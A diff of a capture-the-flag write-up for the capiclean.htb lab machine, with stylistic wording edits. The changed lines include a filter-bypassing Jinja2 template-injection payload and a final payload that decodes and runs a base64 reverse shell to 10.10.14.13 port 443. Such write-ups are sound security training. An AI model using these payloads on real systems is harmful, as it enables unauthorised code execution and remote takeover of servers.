@@ -59,7 +59,7 @@ Ports 22 and 80 open, nothing out of the ordinary.
 
 <br />
 
-We proceed to list the website, but doing so redirects us to the next domain -> capiclean.htb. 
+Proceed to list the website, but doing so redirects us to the next domain -> capiclean.htb. 
 
 So we added it to the /etc/hosts to be able to access:
 
@@ -145,7 +145,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <br />
 
-We fuzzed the web a bit to see if we could find a path where we could use our new cookies and discovered the /dashboard path.
+Fuzzed the web a bit to see if we could find a path where we could use our new cookies and discovered the /dashboard path.
 
 <br />
 
@@ -261,9 +261,9 @@ We're being able to see our output reflected, so the first vulnerability that co
 
 <br />
 
-We did it! The result of the operation is reflected in the output, so let's try to execute a command in the victim machine with one of the most typical jinja2 payloads to bypass the most common filters:
+Did it! The result of the operation is reflected in the output, so let's try to execute a command in the victim machine with one of the most typical jinja2 payloads to bypass the most common filters:
 
-Payload: -> `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
+Payload: -> ```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}```
 
 
 <br />
@@ -287,7 +287,7 @@ YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=
 
 Once we have our payload encoded, we will simply have to enter it into the jinja payload and listen on port 443 to receive the connection when sending the request to the server:
 
-Final Payload -> `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=|base64+-d|bash')|attr('read')()}}`
+Final Payload -> ```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=|base64+-d|bash')|attr('read')()}}```
 
 <br />
 
@@ -295,7 +295,7 @@ Final Payload -> `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|
 
 <br />
 
-We receive the Reverse Shell as the user www-data:
+Receive the Reverse Shell as the user www-data:
 
 <br />
 
